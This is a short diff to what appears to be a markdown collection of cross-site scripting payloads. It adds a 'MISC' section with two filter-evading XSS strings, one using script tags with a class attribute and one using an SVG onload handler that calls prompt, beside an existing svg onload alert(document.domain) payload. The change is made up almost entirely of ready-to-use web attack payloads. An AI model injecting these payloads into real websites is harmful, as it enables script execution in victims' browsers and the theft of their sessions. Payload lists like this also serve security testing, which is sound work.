@@ -33,6 +33,13 @@
 ;//<!----><SCRIPT>alert(1);</SCRIPT><svg onload="alert(document.domain)">
 ```
 
+## MISC <br>
+
+```html
+</script><svg><script/class=rodric>alert(1)</script>-%26apos;
+</SCRIPT>"><svg/OnLoad="`${prompt``}`">exemplo
+```
+
 <br>
 
 <hr>
